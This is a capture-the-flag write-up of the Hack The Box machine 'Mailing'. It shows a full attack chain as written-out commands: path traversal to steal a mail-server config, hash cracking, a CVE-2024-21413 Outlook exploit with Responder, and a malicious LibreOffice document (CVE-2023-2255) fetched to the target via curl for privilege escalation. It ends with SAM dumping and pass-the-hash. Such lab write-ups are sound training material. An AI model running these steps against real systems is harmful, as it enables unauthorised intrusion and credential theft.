A writeup of the Hack The Box machine "Mailing" with easy difficulty

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230041.png'>

**Welcome to this writeup of the HTB seasonal machine called Mailing. It is a Windows machine with easy difficulty.**

Enumeration
======
First, run a Nmap scan which gives the following results: 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230522.png'>

We can see a webpage called mailing.htb so we put this in the /etc/hosts file with the IP of the machine: 10.10.11.14. 

This shows us the webpage >

Next, we run a dirsearch scan to enumerate directories > 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230719.png'>

Hmm alright. There is an /assets page and a /download.php page. 

The /assets page only shows us beautiful pictures of nature üòä and the download page says ‚ÄúNo file specified for download‚Äù.

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230838.png'>

After that someone requested a machine reset lol. 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 230917.png'>

Allright, so I think LFI (Local File Inclusion) is a possible entry point with this /download.php page.  

User flag
======
After some more enumeration, I could download a hMailServer.INI file via the following URL: [http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI](http://mailing.htb/download.php?file=../../../Program+Files+(x86)/hMailServer/Bin/hMailServer.INI)

This file contains the administrator password of something > 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 231035.png'>

These are hashed passwords we have to crack with hashcat > `hashcat --force -m 0 -a 0 pass.txt /usr/share/wordlists/rockyou.txt` --where ‚Äìm 0 stands for a md5 hash. 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 231222.png'>

This password is for telnet access. Port 110 is the pop3 mailserver.  

With the command `telnet 10.10.11.14 110` we can connect to the mailserver. 

<img src='/images/HTB_Mailing/Screenshot 2024-05-29 231313.png'>

There are no messages sadly. But the username and password are correct. 

With the [https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability) exploit a user and a password can be obtained. 

Setup a responder listerner with: `sudo responder -I tun0 -v`

Then we run the following command > `python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password <The-password-we-obtained> --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\IP/blabla" --subject Hello`

This will give you a hash which is a password we can crack with hashcat. 

A Evil winrm can be established with: `evil-winrm -i 10.10.11.14 -u maya -p <Cracked-password>`

The user flag can be found in the Desktop directory >

Root flag
======
After searching the directories on the machine, we discovered that Libreoffice is running an outdated version. After searching for an exploit, we can use this tool: [https://github.com/elweth-sec/CVE-2023-2255](https://github.com/elweth-sec/CVE-2023-2255) to probably gain root.

<img src='/images/HTB_Mailing/Screenshot 2024-06-10 190939.png'>

With this tool we can use the command: `python3 CVE-2023-2255.py --cmd 'net localgroup Administradores maya /add' --output 'exploit.odt'`.

<img src='/images/HTB_Mailing/Screenshot 2024-06-10 191636.png'>

We need to deliver this malicious file to the windows machine. This can be done with a python server and a curl command. > 

In a new terminal window type: `python3 ‚Äìm http.server 4444`

<img src='/images/HTB_Mailing/Screenshot 2024-06-10 191756.png'>

And in our Evil-WinRM: Go the the Important Documents dir (this is a root directory).

And curl the exploit.odt file to the windows machine > `curl ‚Äìo exploit.odt http://10.10.14.82:4444/exploit.odt`.

<img src='/images/HTB_Mailing/Screenshot 2024-06-10 191901.png'>

With the command `net users maya` we have a new admin local group now.

<img src='/images/HTB_Mailing/Screenshot 2024-06-10 192039.png'>

With the post exploitation tool crackmapexec, we can run this command > `crackmapexec smb 10.10.11.14 -u maya -p " <maya-admin-password> " --sam`.

This way we can obtain the localadmin user‚Äôs hash. 

<img src='/images/HTB_Mailing/Screenshot 2024-06-10 192929.png'>

We don‚Äôt have to crack the hash if we use the impacket-wmiexec tool with the command: `impacket-wmiexec localadmin@10.10.11.14 -hashes "<hash-of-administrador>"`

This gives us the root flag >

Conclusion 
======
To pwn this machine took a lot more time than I thought. Again, searching for an entry point in the directories of the machine takes time because of the many dirs and files.  

I hope you have learned something from this writeup. 

Enjoy your day!
